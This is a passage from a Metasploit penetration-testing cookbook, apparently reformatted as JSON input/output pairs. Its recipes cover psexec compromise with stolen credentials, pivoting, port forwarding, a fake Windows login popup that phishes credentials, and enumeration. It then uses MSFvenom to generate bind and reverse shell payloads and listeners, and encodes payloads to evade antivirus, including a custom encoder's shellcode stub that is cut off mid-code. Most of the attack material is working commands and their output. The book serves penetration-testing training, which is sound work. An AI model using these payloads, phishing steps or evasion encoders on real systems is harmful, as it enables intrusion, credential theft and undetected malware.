10.0.0.161\nmsf auxiliary(tcp) > set PORTS 1-500\nPORTS => 1-500\nmsf auxiliary(tcp) > set THREADS 100\nTHREADS => 100\nmsf auxiliary(tcp) > run\n[+] 10.0.0.161: - 10.0.0.161:139 - TCP OPEN\n[+] 10.0.0.161: - 10.0.0.161:135 - TCP OPEN\n[+] 10.0.0.161: - 10.0.0.161:445 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(tcp) >\n[ 219 ]\nPost-Exploitation Chapter 5\n3. Now that we know the target is running SMB, we can use the SMB Version\nDetection auxiliary module to display information about the system:\nmsf auxiliary(tcp) > use auxiliary/scanner/smb/smb_version\nmsf auxiliary(smb_version) > set RHOSTS 10.0.0.161\nRHOSTS => 10.0.0.161\nmsf auxiliary(smb_version) > run\n[+] 10.0.0.161:445 - Host is running Windows 10 Enterprise\n(build:10586) (name:DESKTOP-OJI4NFS) (workgroup:WORKGROUP )\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_version) >\n4. With the information gathered, we can use the Microsoft Windows Authenticated\nUser Code Execution exploit module with credentials collected during post-\nexploitation and try to compromise the target machine:\nmsf auxiliary(smb_version) > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 10.0.0.161\nRHOST => 10.0.0.161\nmsf exploit(psexec) > set SMBUSER User\nSMBUSER => User\nmsf exploit(psexec) > set SMBPASS P4ssw0rd\nSMBPASS => P4ssw0rd\nmsf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp\nPAYLOAD => windows/meterpreter/bind_tcp\nmsf exploit(psexec) > run\n...\nmeterpreter > sysinfo\nComputer : WINDOWS10\nOS : Windows 10 (Build 10586).\nArchitecture : x86\nSystem Language : pt_PT\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter >\n[ 220 ]"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\nPort forwarding with Meterpreter\nDiscussing pivoting is never complete without talking about port forwarding. In this recipe,\nwe will continue from our previous pivoting recipe and see how we can port forward the\ndata and requests from the attacking machine to the internal network server via the target\nnode. An important thing to note here is that we can use port forwarding to access various\nservices of the internal server.\nGetting ready\nWe will start with the same scenario, which we discussed in the previous recipe. We have\ncompromised the Linux server, and we have added the route information to forward all the\ndata packets sent on the network through the Meterpreter session. Let's take a look at the\nroute table:\nmsf > route\nIPv4 Active Routing Table\n=========================\nSubnet Netmask Gateway\n------ ------- -------\n10.0.0.0 255.255.255.0 Session 2\n[*] There are currently no IPv6 routes defined.\nmsf >\nSo, our table is all set. Now we will have to set up port forwarding so that our request\nrelays through to reach the internal network.\n[ 221 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. For this recipe, we will turn on Internet Information Services on the target\nWindows 10 machine and try to access it through port forwarding:\nmeterpreter > portfwd -h\nUsage: portfwd [-h] [add | delete | list | flush] [args]\nOPTIONS:\n-L <opt> Forward: local host to listen on (optional). Reverse:\nlocal host to connect to.\n-R Indicates a reverse port forward.\n-h Help banner.\n-i <opt> Index of the port forward entry to interact with (see\nthe \"list\" command).\n-l <opt> Forward: local port to listen on. Reverse: local port\nto connect to.\n-p <opt> Forward: remote port to connect to. Reverse: remote\nport to listen on.\n-r <opt> Forward: remote host to connect to.\nmeterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.161\n[*] Local TCP relay created: :8080 <-> 10.0.0.161:80\nmeterpreter >\n[ 222 ]\nPost-Exploitation Chapter 5\nSuccessful execution of the command shows that a local TCP relay has been set up\nbetween the attacker and the internal server. The listener port on the attacker\nmachine was set to 8080, and the service to access on the internal server is on port\n80.\n2. As we have already set the route information, the entire relay happens\ntransparently. Now if we try to access the internal server through our browser by\nusing the URL http://127.0.0.1:8080, we will be directed to the HTTP\nintranet service of the internal network:\nPort forwarding can be very handy in situations when you have to run commands or\napplications that Metasploit does not provide. In such situations, you can use port\nforwarding to ease your task.\n[ 223 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nCredential harvesting\nDuring a penetration test, we are not always getting sessions with system or even\nadministrator privileges; most of the time, we will end up with a session from a successful\nphish which is running with user privileges. That is when credential harvesting comes to\nour rescue. With credential harvesting, we will try to perform a phishing attack on the\ntarget to harvest usernames, passwords, and hashes that can be used to further compromise\nthe organization.\nHow to do it...\nTo harvest credentials, we will use the Windows Gather User Credentials post-exploitation\nmodule with which we are able to perform a phishing attack on the target by popping up a\nlogin prompt.\n1. When the user types his/her credentials into the login prompt, they will be sent to\nour attacker machine:\nmsf > use post/windows/gather/phish_windows_credentials\nmsf post(phish_windows_credentials) > set SESSION 1\nSESSION => 1\nmsf post(phish_windows_credentials) > run\n[+] PowerShell is installed.\n[*] Starting the popup script. Waiting on the user to fill in his\ncredentials...\n[+] #< CLIXML\n2. On the target machine, we should see the login prompt, waiting for the user to fill\nin his/her credentials:\n[ 224 ]"
  },
  {
    "input": "Enumeration modules",
    "output": "Post-Exploitation Chapter 5\n3. When the user fills in the login prompt, his/her credentials will be sent to our\nattacker machine:\n[+] UserName Domain Password\n-------- ------ --------\nUser WINDOWS10 P4ssw0rd\n[*] Post module execution completed\nmsf post(phish_windows_credentials) >\nGreat! Looking at the output of the module, we can see that we were able to collect the\nuser's credentials.\nEnumeration modules\nAfter successfully compromising a target, our next task is to start enumeration. Getting a\nsession is only the beginning; with each new compromise, our target has a plethora of\ninformation which we, as penetration testers, can use to try to escalate our privileges and\nstart pivoting to other targets in the internal network.\n[ 225 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. We will start enumeration by using the Windows Gather Installed Application\nEnumeration post-exploitation module, which will enumerate all installed\napplications:\nmsf > use post/windows/gather/enum_applications\nmsf post(enum_applications) > set SESSION 1\nSESSION => 1\nmsf post(enum_applications) > run\n[*] Enumerating applications installed on VAGRANT-2008R2\nInstalled Applications\n======================\nName Version\n---- -------\n7-Zip 16.04(x64) 16.04\nJava 8 Update 144 8.0.1440.1\nJava 8 Update 144 (64-bit) 8.0.1440.1\nJava Auto Updater 2.8.144.1\nJava SE Development Kit 8 Update 144 (64-bit) 8.0.1440.1\n...\nmsf post(enum_applications) >\nLooking at the output of the module, we can see how this could be useful during a\npenetration test. Knowing which applications are installed in the target will ease\nour task of finding possible privilege escalation exploits.\n[ 226 ]\nPost-Exploitation Chapter 5\n2. To further increase our chances of compromising the organization, we can use\nthe Windows Gather SNMP Settings Enumeration post-exploitation module. This\nmodule will allow us to enumerate the SNMP service configuration, and\nenumerate the SNMP community strings, which can be used to compromise\nother targets in the network:\nmsf post(enum_applications) > use post/windows/gather/enum_snmp\nmsf post(enum_snmp) > set SESSION 1\nSESSION => 1\nmsf post(enum_snmp) > run\n...\n[*] No Traps are configured\n[*] Post module execution completed\nmsf post(enum_snmp) >\n3. Next, we can try to enumerate current and recently logged on Windows users\nusing the Windows Gather Logged On User Enumeration post-exploitation\nmodule:\nmsf post(enum_snmp) > use post/windows/gather/enum_logged_on_users\nmsf post(enum_logged_on_users) > set SESSION 1\nSESSION => 1\nmsf post(enum_logged_on_users) > run\n[*] Running against session 1\nCurrent Logged Users\n====================\nSID User\n--- ----\nS-1-5-18 NT AUTHORITY\\SYSTEM\nS-1-5-21-653170132-1988196614-1572848168-1002\nVAGRANT-2008R2\\sshd_server\nS-1-5-21-653170132-1988196614-1572848168-500\nVAGRANT-2008R2\\Administrator\n...\n[*] Post module execution completed\nmsf post(enum_logged_on_users) >\n[ 227 ]"
  },
  {
    "input": "Autoroute and socks proxy server",
    "output": "Post-Exploitation Chapter 5\nMetasploit has several modules that will help you do enumeration during the\npost-exploitation phase, so I advise you to try them and learn how they can help\nyou during a penetration test:\nAutoroute and socks proxy server\nMetasploit has an amazing number of modules that can help you achieve your goals, but\nsometimes you may want to leverage a session and run different or even your own tools.\nWe can do this by routing the traffic through the session and then setting up a socks proxy.\n[ 228 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nHow to do it...\n1. First, we need to route the traffic through the session; in previous recipes, we\nused the route command. So, this time, we will check the Multi Manage\nNetwork Route via the Meterpreter Session post-exploitation module by setting\nthe session to run this module on the subnet we wish to access through this\nsession:\nmsf > use post/multi/manage/autoroute\nmsf post(autoroute) > set SESSION 1\nSESSION => 1\nmsf post(autoroute) > set SUBNET 10.0.0.0/24\nSUBNET => 10.0.0.0/24\nmsf post(autoroute) > run\n[!] SESSION may not be compatible with this module.\n[*] Running module against VAGRANT-2008R2\n[*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.0.0.0/255.255.255.0 from host's\nrouting table.\n[+] Route added to subnet 192.168.216.0/255.255.255.0 from host's\nrouting table.\n[*] Post module execution completed\nmsf post(autoroute) >\n2. Next, we can use the Socks4a Proxy Server auxiliary module to start a socks4a\nproxy server on port 9050, which uses built-in Metasploit routing to relay\nconnections:\nmsf post(autoroute) > use auxiliary/server/socks4a\nmsf auxiliary(socks4a) > set SRVPORT 9050\nSRVPORT => 9050\nmsf auxiliary(socks4a) > run\n[*] Auxiliary module running as background job 0.\nmsf auxiliary(socks4a) >\n[*] Starting the socks4a proxy server\nmsf auxiliary(socks4a) >\n[ 229 ]\nPost-Exploitation Chapter 5\n3. Now, we can use ProxyChains to redirect connections through our proxy server.\nIn this recipe, we will use nmap to port scan a target machine in the internal\nnetwork:\nroot@kali:~# proxychains nmap -Pn -sT -sV -p 80,139,445 10.0.0.160\nProxyChains-3.1 (http://proxychains.sf.net)\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-12-09 08:56 EST\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:445-<><>-OK\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:80-<><>-OK\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:139-<><>-OK\n...\nService detection performed. Please report any incorrect results at\nhttps://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.58 seconds\nroot@kali:~#\n4. Then, use the pth-winexe command to get a shell on the target system:\nroot@kali:~# proxychains pth-winexe -U Windows10/User%P4ssw0rd\n//10.0.0.160 cmd.exe\nProxyChains-3.1 (http://proxychains.sf.net)\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:445-<><>-OK\nE_md4hash wrapper called.\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:445-<><>-OK\n|S-chain|-<>-127.0.0.1:9050-<><>-10.0.0.160:445-<><>-OK\nMicrosoft Windows [Version 10.0.10586]\n(c) 2016 Microsoft Corporation. All rights reserved.\nC:\\Windows\\system32>hostname\nhostname\nWINDOWS10\nC:\\Windows\\system32>\nAs you can see, although Metasploit provides us with a huge number of modules and\npossibilities, we are not restricted to use those modules. Using autoroute and the socks\nproxy server, we can use other tools and frameworks during the post-exploitation phase.\n[ 230 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nAnalyzing an existing post-exploitation\nmodule\nSo far, we have seen the utility of modules and the power that they can add to the\nframework. To master the framework, it is essential to understand the working and\nbuilding of modules. This will help us in quickly extending the framework according to our\nneeds. In the next few recipes, we will show you how we can use Ruby scripting to build\nour own modules and import them into the framework.\nGetting ready\nTo start building our own module, we will need basic knowledge of Ruby scripting. In this\nrecipe, we will show you how we can use Ruby to start building modules for the\nframework. So, let's discuss some of the essential requirements for module building.\nHow to do it...\nLet's start with some of the basics of module building:\n1. First, we need to define the class that inherits the properties of the auxiliary\nfamily. The module can import several functionalities, such as scanning, opening\nconnections, using the database, and so on:\nclass MetasploitModule < Msf::Post\n2. The include statement can be used to include a particular functionality of the\nframework into our own module:\ninclude Msf::Post::Windows::WMIC\n3. The following few lines give us an introduction to the module, such as its name,\nversion, author, description, and so on:\nclass MetasploitModule < Msf::Post\ninclude Msf::Post::Windows::WMIC\ndef initialize(info={})\nsuper( update_info( info,\n'Name' => 'Windows Gather Run Specified WMIC Command',\n'Description' => %q{ This module will execute a given WMIC\n[ 231 ]\nPost-Exploitation Chapter 5\ncommand options or read\nWMIC commands options from a resource file and execute the\ncommands in the\nspecified Meterpreter session.},\n'License' => MSF_LICENSE,\n'Author' => [ 'Carlos Perez\n<carlos_perez[at]darkoperator.com>'],\n'Platform' => [ 'win' ],\n'SessionTypes' => [ 'meterpreter' ]\n))\nregister_options(\n[\nOptPath.new('RESOURCE', [false, 'Full path to resource file\nto read commands from.']),\nOptString.new('COMMAND', [false, 'WMIC command options.']),\n])\nend\n4. Finally, the run method is where we start writing our code:\n# Run Method for when run command is issued\ndef run\ntmpout = \"\"\nprint_status(\"Running module against #{sysinfo['Computer']}\")\nif datastore['RESOURCE']\nif ::File.exist?(datastore['RESOURCE'])\n::File.open(datastore['RESOURCE']).each_line do |cmd|\nnext if cmd.strip.length < 1\nnext if cmd[0,1] == \"#\"\nprint_status \"Running command #{cmd.chomp}\"\nresult = wmic_query(cmd.chomp)\nstore_wmic_loot(result, cmd)\nend\nelse\nraise \"Resource File does not exists!\"\nend\nelsif datastore['COMMAND']\ncmd = datastore['COMMAND']\nresult = wmic_query(cmd)\nstore_wmic_loot(result, cmd)\nend\nend\n[ 232 ]"
  },
  {
    "input": "How it works...",
    "output": "Post-Exploitation Chapter 5\ndef store_wmic_loot(result_text, cmd)\ncommand_log = store_loot(\"host.command.wmic\",\n\"text/plain\",\nsession,\nresult_text,\n\"#{cmd.gsub(/\\.|\\/|\\s/,\"_\")}.txt\",\n\"Command Output \\'wmic\n#{cmd.chomp}\\'\")\nprint_status(\"Command output saved to: #{command_log}\")\nend\nend\nNow that we have built some background about module building, our next step will be to\nanalyze the module. It is highly recommended that you look at existing modules if you\nhave to learn and dive deeper into module and platform development.\nHow it works...\nLet's start with the analysis of the main script body to understand how it works:\n1. The module starts by verifying if a resource file is supplied. If so, it will run a\nWMIC query for each line and store the results:\nif datastore['RESOURCE']\nif ::File.exist?(datastore['RESOURCE'])\n::File.open(datastore['RESOURCE']).each_line do |cmd|\nnext if cmd.strip.length < 1\nnext if cmd[0,1] == \"#\"\nprint_status \"Running command #{cmd.chomp}\"\nresult = wmic_query(cmd.chomp)\nstore_wmic_loot(result, cmd)\nend\nelse\nraise \"Resource File does not exists!\"\nend\n[ 233 ]"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\n2. Otherwise, it will check for a wmic command, run it, and store the results:\nelsif datastore['COMMAND']\ncmd = datastore['COMMAND']\nresult = wmic_query(cmd)\nstore_wmic_loot(result, cmd)\nend\nend\nWriting a post-exploitation module\nNow, we have covered enough background about building modules. In this recipe, we will\nsee an example of how we can build our own module and add it to the framework. Building\nmodules can be very handy, as they will give us the power of extending the framework\ndepending on our needs.\nGetting ready\nLet's build a small post-exploitation module that will enumerate all of the users on the\ntarget using WMIC. As it is a post-exploitation module, we will require a compromised\ntarget in order to execute the module:\nclass MetasploitModule < Msf::Post\ninclude Msf::Post::Windows::WMIC\nThe script starts up with the class that extends the properties of the Msf::Post modules\nand the include statement to include the WMIC functionality.\nNext, we will define the module's name, description, author, platform, and session type:\ndef initialize(info={})\nsuper( update_info( info,\n'Name' => 'Windows WMIC User Gather',\n'Description' => %q{\nThis module will enumerate user accounts using WMIC.\n},\n'License' => MSF_LICENSE,\n'Author' => [\n'Daniel Teixeira <danieljcrteixeira[at]gmail.com>',\n],\n[ 234 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\n'Platform' => [ 'win' ],\n'SessionTypes' => [ 'meterpreter' ]\n))\nend\nFor the run method, we will use wmic_query to enumerate the user accounts:\n# Main method\ndef run\nprint_status(\"Executing command\")\ncommand = wmic_query(\"useraccount get name\")\nputs command\nend\nend\nMetasploit follows the hierarchy of a generalized to specialized format for storing modules.\nIt starts with the type of modules, such as an exploit module or an auxiliary module. Then it\npicks up a generalized name, for example, the name of an affected operating system. Next,\nit creates a more specialized functionality; for example, the module is used for browsers.\nFinally, the most specific naming is used, such as the name of the browser that the module\nis targeting.\nLet's consider our module. This module is a post-exploitation module that is used to\nenumerate a Windows operating system and gathers information about the system. So, our\nmodule should follow this convention for storing information.\nOur destination folder should be modules/post/windows/gather/. You can save the\nmodule with your desired name and with an .rb extension. Let's save it as\nwmic_user_enum.rb.\nHow to do it...\nOnce we have saved the module in its preferred directory, the next step will be to execute it\nand see if it is working. We have already seen the process of module execution in previous\nrecipes:\nmsf exploit(psexec) > use post/windows/gather/wmic_user_enum\nmsf post(wmic_user_enum) > set SESSION 1\nSESSION => 1\nmsf post(wmic_user_enum) > run\n[*] Executing command\nName\n[ 235 ]\nPost-Exploitation Chapter 5\nAdministrator\nanakin_skywalker\n...\n[*] Post module execution completed\nmsf post(wmic_user_enum) >\nThis is a small example of how you can build and add your own module to the framework.\nYou definitely need a sound knowledge of Ruby scripting if you want to build good\nmodules. You can also contribute to the Metasploit community by releasing your module\nand let others benefit from it.\n[ 236 ]"
  },
  {
    "input": "Introduction",
    "output": "6\nUsing MSFvenom\nIn this chapter, we will cover the following recipes:\nPayloads and payload options\nEncoders\nOutput formats\nTemplates\nMeterpreter payloads with trusted certificates\nIntroduction\nBy now, you should already be familiar with MSFvenom, as we have used it a couple of\ntimes in previous recipes. MSFvenom is the tool to use for payload generation and encoding\nand it is an evolution of msfpayload and msfencode, which it replaced on June 8th, 2015.\nIn this chapter, we dig a bit deeper on the available payloads, learn why encoders can be\nuseful when trying to evade detection, check the available executable, transform output\nformats, and much more."
  },
  {
    "input": "How to do it...",
    "output": "Using MSFvenom Chapter 6\nPayloads and payload options\nWe can tell MSFvenom is one of the most versatile and useful payload-generation tools just\nby looking at the available payloads; the list proves that MSFvenom can help you get a\nsession in almost any situation.\nGetting ready\nTo start experimenting with msfvenom, launch a Terminal window, and use msfvenom –h\nor msfvenom --help to display the help menu.\nHow to do it...\n1. Let's take a look at the available payloads, using the msfvenom command with\nthe -l option:\nroot@kali:~# msfvenom -l payloads\nBecause the output of the command is too extensive to fit in this recipe, I will\nleave that for you to try out.\n2. To generate a payload, we always need to use at least two options, -p and -f.\nThe -p option is used to specify which payload to generate from all those\navailable in the Metasploit Framework, in this example a bind shell via GNU\nAWK:\nroot@kali:~# msfvenom -p cmd/unix/bind_awk -f raw\nNo platform was selected, choosing Msf::Module::Platform::Unix from\nthe payload\nNo Arch selected, selecting Arch: cmd from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 96 bytes\nawk 'BEGIN{s=\"/inet/tcp/4444/0/0\";for(;s|&getline\nc;close(c))while(c|getline)print|&s;close(s)}'\n[ 238 ]\nUsing MSFvenom Chapter 6\n3. The -f option is used to specify the output format and to list all the available\nformats, use msfvenom with the --help-formats option:\nroot@kali:~# msfvenom --help-formats\nExecutable formats\nasp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-\nservice, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-\nnouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-\nexe, vba-psh, vbs, war\nTransform formats\nbash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl,\npl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication,\nvbscript\nThe are two types of formats in msfvenom, executable and transform\nformats. Executable formats will generate programs and scripts, while transform\nformats will just produce the payload.\n4. We can also specify a custom payload by using the -p option with -, which can\nbe useful when trying to evade security solutions:\nroot@kali:~# cat custom.raw | msfvenom -p - -a x64 --platform linux\n-f elf -o custom.elf\nAttempting to read payload from STDIN...\nNo encoder or badchars specified, outputting raw payload\nPayload size: 86 bytes\nFinal size of elf file: 206 bytes\nSaved as: custom.elf\nroot@kali:~#\nWhen generating payloads, we use the -a option for the architecture to use, --\nplatform to specify the platform of the payload, and -o to save the payload.\n5. To list all the available platforms, use msfvenom with the --help-platforms\noption:\nroot@kali:~# msfvenom --help-platforms\nPlatforms\naix, android, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux,\nirix, java, javascript, linux, mainframe, multi, netbsd, netware,\nnodejs, openbsd, osx, php, python, r, ruby, solaris, unix, windows\nroot@kali:~#\n[ 239 ]\nUsing MSFvenom Chapter 6\n6. One useful feature when doing exploit development, is the --smallest option,\nwhich we can use to generate the smallest possible payload:\nroot@kali:~# msfvenom -p linux/x64/shell_bind_tcp -f elf --smallest\n-o small.elf\nNo platform was selected, choosing Msf::Module::Platform::Linux\nfrom the payload\nNo Arch selected, selecting Arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 86 bytes\nFinal size of elf file: 206 bytes\nSaved as: small.elf\nroot@kali:~#\n7. To test this payload, we can set the execution permission using the chmod\ncommand, and then run the payload:\nroot@kali:~# chmod +x small.elf\nroot@kali:~# ./small.elf\n8. In another terminal, we can use netcat to connect to the bind shell on port 4444:\nroot@kali:~# nc 127.0.0.1 4444\nhostname\nkali\nid\nuid=0(root) gid=0(root) groups=0(root)\nGreat, we have a small Linux payload that we can use\n9. Now that we have learned how to create a basic bind shell, we will try to create a\nreverse shell. First, we need to see the available options for the selected payload,\nwhich we can do using the --payload-options option:\n[ 240 ]\nUsing MSFvenom Chapter 6\n10. The options available are overwhelming, but, for the time being, we just need to\nset up the basic options, such as the listen address and port:\nroot@kali:~# msfvenom -p linux/x64/shell/reverse_tcp\nLHOST=192.168.216.5 LPORT=1234 -f elf -o reverse.elf\nNo platform was selected, choosing Msf::Module::Platform::Linux\nfrom the payload\nNo Arch selected, selecting Arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 127 bytes\nFinal size of elf file: 247 bytes\n[ 241 ]\nUsing MSFvenom Chapter 6\nSaved as: reverse.elf\nroot@kali:~#\n11. To test our payload, we first need to set up our listener on port 1234 in\nMetasploit, using the Generic Payload Handler exploit module:\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD linux/x64/shell/reverse_tcp\nPAYLOAD => linux/x64/shell/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > set LPORT 1234\nLPORT => 1234\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:1234\n12. Next, set the execution permission using the chmod command, and then run the\npayload:\nroot@kali:~# chmod +x reverse.elf\nroot@kali:~# ./reverse.elf\n13. As expected, we have a new session:\n[*] Sending stage (38 bytes) to 192.168.216.5\n[*] Command shell session 1 opened (192.168.216.5:1234 ->\n192.168.216.5:52172) at 2017-12-10 07:00:02 -0500\nhostname\nkali\nid\nuid=0(root) gid=0(root) groups=0(root)\n14. Creating payloads for a Windows target is as easy; all we need to do is specify the\narchitecture to use, the target platform, the payload we need to run on the target,\nthe listen followed by the output format and name:\nroot@kali:~# msfvenom -a x86 --platform windows -p\nwindows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -o\npayload.exe\nNo encoder or badchars specified, outputting raw payload\nPayload size: 333 bytes\nFinal size of exe file: 73802 bytes\nSaved as: payload.exe\n[ 242 ]\nUsing MSFvenom Chapter 6\n15. Next, we need to set up the listener in Metasploit, using the Generic Payload\nHandler exploit module:\nroot@kali:~# msfconsole -q\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:4444\n16. Now that we have the listener ready, we simply need to download the payload to\nthe Windows target machine and run it, which should return a new session:\nmsf exploit(handler) > run\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] Sending stage (179779 bytes) to 192.168.216.10\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.10:49675) at 2017-12-11 15:46:11 +0000\nmeterpreter >\nSpecifying an additional win32 shellcode, by using the -c or --add-code option,\nwe can turn multiple payloads into one.\n17. First, we will create a simple payload that will pop up a message on the target,\nusing the windows/messagebox payload:\nroot@kali:~# msfvenom -a x86 --platform windows -p\nwindows/messagebox TEXT=\"First Payload\" -f raw > First_Payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 267 bytes\nroot@kali:~#\n[ 243 ]"
  },
  {
    "input": "Encoders",
    "output": "Using MSFvenom Chapter 6\n18. Then, we will use the -c option to add our first payload to the second:\nroot@kali:~# msfvenom -c First_Payload -a x86 --platform windows -p\nwindows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -o\nmulti.exe\nAdding shellcode from First_Payload to the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 917 bytes\nFinal size of exe file: 73802 bytes\nSaved as: multi.exe\nroot@kali:~#\n19. When we execute the payload, we get a message box on the target machine and a\nnew session on our listener:\nEncoders\nGenerating payloads is just the first step; nowadays security products, such as Intrusion\nDetection Systems (IDSs), antivirus and anti-malware software, can easily pick up the\nshellcode generated by MSFvenom. To help us evade security, we can use encoders to\nencode our shellcode.\n[ 244 ]"
  },
  {
    "input": "How to do it...",
    "output": "Using MSFvenom Chapter 6\nHow to do it...\n1. By using MSFconsole with the show encoders option, or by browsing to the\n/usr/share/metasploit-framework/modules/encoders/ folder in our Kali\nLinux machine, we can see all the encoders available on the Metasploit\nFramework:\nmsf > show encoders\n2. To encode one of our previous payloads, we simple add the -e option, followed\nby the encoder we want to use, and, if we so choose, we can use the -i option,\nfollowed by the number of times to encode the payload:\nmsf > msfvenom -a x86 --platform windows -p\nwindows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -e\nx86/shikata_ga_nai -i 10 -o encoded.exe\n[*] exec: msfvenom -a x86 --platform windows -p\nwindows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -e\nx86/shikata_ga_nai -i 10 -o encoded.exe\nFound 1 compatible encoders\nAttempting to encode payload with 10 iterations of\nx86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 360 (iteration=0)\nx86/shikata_ga_nai succeeded with size 387 (iteration=1)\nx86/shikata_ga_nai succeeded with size 414 (iteration=2)\nx86/shikata_ga_nai succeeded with size 441 (iteration=3)\nx86/shikata_ga_nai succeeded with size 468 (iteration=4)\nx86/shikata_ga_nai succeeded with size 495 (iteration=5)\nx86/shikata_ga_nai succeeded with size 522 (iteration=6)\nx86/shikata_ga_nai succeeded with size 549 (iteration=7)\nx86/shikata_ga_nai succeeded with size 576 (iteration=8)\nx86/shikata_ga_nai succeeded with size 603 (iteration=9)\nx86/shikata_ga_nai chosen with final size 603\nPayload size: 603 bytes\nFinal size of exe file: 73802 bytes\nSaved as: encoded.exe\nmsf >\n[ 245 ]\nUsing MSFvenom Chapter 6\n3. To verify whether your payload is going to be detected by the antivirus, we can\nuse VirusTotal:\nUnfortunately, as I expected, most antiviruses will detect our payload even\nthough we encoded it 10 times. With time, security companies started detecting\nthe default encoders in Metasploit. But all is not lost; if we use custom encoders,\nwe can still leverage Metasploit to bypass security products.\n[ 246 ]\nUsing MSFvenom Chapter 6\n4. In this recipe, we will use a custom encoder created by François Profizi, which\nuses a brute force attack on a known plaintext to bypass security products:\n##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'msf/core'\nclass MetasploitModule < Msf::Encoder\ndef initialize\nsuper(\n'Name' => 'bf_xor',\n'Description' => '',\n'Author' => 'François Profizi',\n'Arch' => ARCH_X86,\n'License' => MSF_LICENSE\n)\nend\ndef decoder_stub(state)\nstub = \"\"\nstub <<\n\"\\xEB\\x62\\x55\\x8B\\xEC\\x83\\xEC\\x18\\x8B\\x7D\\x10\\x8B\\x75\\x0C\\x33\\xC0\\x\n89\\x45\\xFC\\x8B\"\nstub <<\n\"\\xC8\\x83\\xE1\\x03\\x03\\xC9\\x03\\xC9\\x03\\xC9\\x8B\\xDA\\xD3\\xFB\\x8A\\xCB\\x\n33\\xDB\\x39\\x5D\"\nstub <<\n\"\\x14\\x75\\x18\\x0F\\xB6\\x1E\\x0F\\xB6\\xC9\\x33\\xD9\\x8B\\x4D\\x08\\x0F\\xB6\\x\n0C\\x08\\x3B\\xD9\"\nstub <<\n\"\\x75\\x07\\xFF\\x45\\xFC\\xEB\\x02\\x30\\x0E\\x40\\x46\\x3B\\xC7\\x7C\\xC8\\x3B\\x\n7D\\xFC\\x74\\x10\"\nstub <<\n\"\\x83\\x7D\\x14\\x01\\x74\\x06\\x42\\x83\\xFA\\xFF\\x72\\xAF\\x33\\xC0\\xEB\\x02\\x\n8B\\xC2\\xC9\\xC3\"\nstub <<\n\"\\x55\\x8B\\xEC\\x83\\xEC\\x10\\xEB\\x50\\x58\\x89\\x45\\xFC\\xEB\\x37\\x58\\x8B\\x\n10\\x89\\x55\\xF8\"\nstub <<\n\"\\x83\\xC0\\x04\\x89\\x45\\xF4\\x33\\xDB\\x33\\xC0\\x50\\x6A\\x0A\\xFF\\x75\\xFC\\x\nFF\\x75\\xF4\\xE8\"\nstub <<\n[ 247 ]\nUsing MSFvenom Chapter 6\n\"\\x72\\xFF\\xFF\\xFF\\x85\\xC0\\x74\\x13\\x6A\\x01\\xFF\\x75\\xF8\\xFF\\x75\\xFC\\x\nFF\\x75\\xF4\\xE8\"\nstub <<\n\"\\x5E\\xFF\\xFF\\xFF\\xFF\\x65\\xFC\\xC9\\xC3\\xE8\\xC4\\xFF\\xFF\\xFF\"\nstub << [state.buf.length].pack(\"L\") # size payload\nstub << state.buf[0,10]\nstub << \"\\xE8\\xAB\\xFF\\xFF\\xFF\"\nreturn stub\nend\ndef encode_block(state, block)\nkey = rand(4294967295)\nencoded = \"\"\nkey_tab = 